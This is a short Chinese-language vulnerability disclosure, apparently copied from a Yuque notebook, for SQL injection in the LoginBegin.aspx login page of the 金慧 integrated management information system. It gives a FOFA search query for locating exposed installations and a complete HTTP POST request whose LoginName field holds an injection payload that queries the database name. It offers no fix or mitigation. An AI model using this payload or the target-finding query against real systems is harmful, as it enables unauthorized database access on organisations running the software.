# 金慧综合管理信息系统LoginBegin存在sql注入漏洞

# 一、漏洞简介
金慧综合管理信息系统LoginBegin存在sql注入漏洞

# 二、影响版本
+ 金慧综合管理信息系统

# 三、资产测绘
+ fofa`app="金慧-综合管理信息系统"`
+ 特征

![1721921858962-77717a38-8222-4d54-a644-7eaa5cf8727a.png](./img/s-W9Z5FFLeIkJsE1/1721921858962-77717a38-8222-4d54-a644-7eaa5cf8727a-034732.png)

# 四、漏洞复现
```plain
POST /Portal/LoginBegin.aspx HTTP/1.1
Upgrade-Insecure-Requests: 1
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Chrome/23.0.1271.64 Safari/537.11
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Host: 

Todo=Validate&LoginName=beczou'or (select db_name())>0--&Password=admin&CDomain=Local&FromUrl=admin
```

![1721921873278-42d20cf4-a157-42ed-9fed-ad044cefe8a1.png](./img/s-W9Z5FFLeIkJsE1/1721921873278-42d20cf4-a157-42ed-9fed-ad044cefe8a1-037486.png)



> 更新: 2024-08-12 17:15:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ccmkokynsqfrhghm>